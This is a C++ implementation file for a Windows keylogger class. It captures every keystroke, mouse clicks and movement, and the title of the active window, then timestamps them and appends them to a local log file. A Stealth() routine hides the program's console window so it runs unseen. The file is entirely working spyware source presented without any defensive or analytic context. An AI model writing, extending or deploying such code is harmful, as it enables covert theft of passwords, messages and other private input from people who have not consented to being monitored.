#include "Keylogger.h"

// Constructor function: init the array of virtual keys for GetAsyncKeyState()
Keylogger::Keylogger(void) : _file(LOGS_FILE, std::ofstream::binary), _hwnd(GetForegroundWindow()),
_mouseClick(0), _tMouseClick(0), _x(0), _y(0), _rX(0), _rY(0), _tX(0), _tY(0), _pause(false), _sendProcess(false),
_sendMouse(true), _sendKeyboard(true) {
	this->_vk[8] = "BackSpace";
	this->_vk[9] = "Tab";
	this->_vk[13] = "Return";
	this->_vk[16] = "Shift";
	this->_vk[17] = "Control";
	this->_vk[18] = "Alt";
	this->_vk[19] = "Pause";
	this->_vk[20] = "CapsLock";
	this->_vk[27] = "Escape";
	this->_vk[32] = " ";
	this->_vk[33] = "PageUp";
	this->_vk[34] = "PageDown";
	this->_vk[35] = "End";
	this->_vk[36] = "Home";
	this->_vk[37] = "Left";
	this->_vk[38] = "Up";
	this->_vk[39] = "Right";
	this->_vk[40] = "Down";
	this->_vk[44] = "PrintScreen";
	this->_vk[45] = "Insert";
	this->_vk[46] = "Delete";
	this->_vk[48] = "0";
	this->_vk[49] = "1";
	this->_vk[50] = "2";
	this->_vk[51] = "3";
	this->_vk[52] = "4";
	this->_vk[53] = "5";
	this->_vk[54] = "6";
	this->_vk[55] = "7";
	this->_vk[56] = "8";
	this->_vk[57] = "9";
	this->_vk[91] = "LWin";
	this->_vk[92] = "RWin";
	this->_vk[93] = "Apps";
	this->_vk[96] = "NumPad0";
	this->_vk[97] = "NumPad1";
	this->_vk[98] = "NumPad2";
	this->_vk[99] = "NumPad3";
	this->_vk[100] = "NumPad4";
	this->_vk[101] = "NumPad5";
	this->_vk[102] = "NumPad6";
	this->_vk[103] = "NumPad7";
	this->_vk[104] = "NumPad8";
	this->_vk[105] = "NumPad9";
	this->_vk[106] = "Multiply";
	this->_vk[107] = "Add";
	this->_vk[109] = "Subtract";
	this->_vk[110] = "Decimal";
	this->_vk[111] = "Divide";
	this->_vk[112] = "F1";
	this->_vk[113] = "F2";
	this->_vk[114] = "F3";
	this->_vk[115] = "F4";
	this->_vk[116] = "F5";
	this->_vk[117] = "F6";
	this->_vk[118] = "F7";
	this->_vk[119] = "F8";
	this->_vk[120] = "F9";
	this->_vk[121] = "F10";
	this->_vk[122] = "F11";
	this->_vk[123] = "F12";
	this->_vk[124] = "F13";
	this->_vk[125] = "F14";
	this->_vk[126] = "F15";
	this->_vk[127] = "F16";
	this->_vk[144] = "NumLock";
	this->_vk[145] = "ScrollLock";
	this->_vk[160] = "LShift";
	this->_vk[161] = "RShift";
	this->_vk[162] = "LControl";
	this->_vk[163] = "RControl";
	this->_vk[164] = "LAlt";
	this->_vk[165] = "RAlt";
}

// Private functions

// Handle keyboard logs
void Keylogger::HandleKeys(const char &c, std::string &sKey, const int &i, std::string &str) {
	str += "KEYBOARD: ";
	if (c)
		str += c;
	else if (sKey != "") {
		str += "[";
		str += sKey;
		str += "]";
	}
	else
		str += "[" + std::to_string(i) + "]";
}

// Set date and time on logs
void Keylogger::TimeLog(std::string &str) {
	std::string time;

	_time64(&this->_longTime);
	_localtime64_s(&this->_time, &this->_longTime);
	asctime_s(this->_timeBuff, 26, &this->_time);
	time = this->_timeBuff;
	time.erase(std::remove(time.begin(), time.end(), '\n'), time.end());
	time += " | " + str;
	str = time;
}

// Create logs mouse mouvements, position, and position within the current process
bool Keylogger::HandleMouse(std::string &str) {
	if (this->_x != this->_tX || this->_y != this->_tY) {
		str += "MOUSE: Direction (";
		if (this->_x < this->_tX)
			str += "LEFT, ";
		else if (this->_x > this->_tX)
			str += "RIGHT, ";
		else
			str += "SAME, ";
		if (this->_y < this->_tY)
			str += "UP) ";
		else if (this->_y > this->_tY)
			str += "DOWN) ";
		else
			str += "SAME) ";
		str += "Global Pos (";
		str += std::to_string(this->_x);
		str += ", ";
		str += std::to_string(this->_y);
		str += ") ";
		str += "Relative Pos (";
		str += std::to_string(this->_rX);
		str += ", "; 
		str += std::to_string(this->_rY);
		str += ")";
		this->_tX = this->_x;
		this->_tY = this->_y;
		return TRUE;
	}
	return FALSE;
}

// Get mouse clicks
bool Keylogger::HandleMouseClick(std::string &str) {
	if (this->_mouseClick == 1 && this->_tMouseClick == 0) {
		this->_tMouseClick = 1;
		str = "MOUSE: LEFT pressed";
	}
	if (this->_mouseClick == 0 && this->_tMouseClick == 1) {
		this->_tMouseClick = 0;
		str = "MOUSE: LEFT released";
	}
	if (this->_mouseClick == 2 && this->_tMouseClick == 0) {
		this->_tMouseClick = 2;
		str = "MOUSE: RIGHT pressed";
	}
	if (this->_mouseClick == 0 && this->_tMouseClick == 2) {
		this->_tMouseClick = 0;
		str = "MOUSE: RIGHT released";
	}
	if (this->_mouseClick == 1 && this->_tMouseClick == 0) {
		this->_tMouseClick = 1;
		str = "MOUSE: MID pressed";
	}
	if (this->_mouseClick == 0 && this->_tMouseClick == 1) {
		this->_tMouseClick = 0;
		str = "MOUSE: MID released";
	}
	if (str.length() > 0) {
		return TRUE;
	}
	return FALSE;
}

// Public functions

// Hide programm
void Keylogger::Stealth(void) {
	AllocConsole();
	HWND WindowHandler = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(WindowHandler, 0);
}

// Get window object of the client's current process
bool Keylogger::GetWindow(std::string &str) {
	char wnd_title[256];

	this->_tHwnd = GetForegroundWindow();
	if (this->_tHwnd != this->_hwnd) {
		GetWindowText(this->_tHwnd, wnd_title, sizeof(wnd_title));
		this->_hwnd = this->_tHwnd;
		str = "PROCESS: ";
		str += wnd_title;
		PrintLog(str, LOGS_FILE);
		return TRUE;
	}
	return FALSE;
}

// Get keys inputs
bool Keylogger::GetKeys(std::string &str) {
	std::string sKey;
	int shift;
	char c;

	c = NULL;
	sKey = "";
	for (int i = 8; i < 255; ++i) {
		if (GetAsyncKeyState(i) == -32767) {
			if (i > 64 && i < 91) {
				(this->_capsLock) ? c = i : c = i + 32;
				shift = GetKeyState(VK_SHIFT);
				if (shift < 0 && c > 64 && c < 91)
					c += 32;
				else if (shift < 0 && c > 96 && c < 123)
					c -= 32;
			}
			else if (i < SIZEOF_VK && this->_vk[i]) {
				if (i == 20)
					this->_capsLock = !this->_capsLock;
				sKey = this->_vk[i];
			}
			HandleKeys(c, sKey, i, str);
			return TRUE;
		}
	}
	return FALSE;
}

// Get mouse inputes
bool Keylogger::GetMouse(std::string &str) {
	if (GetAsyncKeyState(VK_LBUTTON))
		this->_mouseClick = 1;
	else if (GetAsyncKeyState(VK_RBUTTON))
		this->_mouseClick = 2;
	else if (GetAsyncKeyState(VK_MBUTTON))
		this->_mouseClick = 3;
	else
		this->_mouseClick = 0;
	if (GetCursorPos(&this->_p)) {
		this->_x = this->_p.x;
		this->_y = this->_p.y;
	}
	if (ScreenToClient(this->_hwnd, &this->_p)) {
		this->_rX = this->_p.x;
		this->_rY = this->_p.y;
	}
	if (HandleMouseClick(str))
		return TRUE;
	if (HandleMouse(str))
		return TRUE;
	return FALSE;
}

// Save logs to file
int	Keylogger::PrintLog(std::string &str, const char* file) {
	TimeLog(str);
	this->_file.open(LOGS_FILE, std::ios::app);
	this->_file << str << std::endl;
	this->_file.close();
	return 0;
}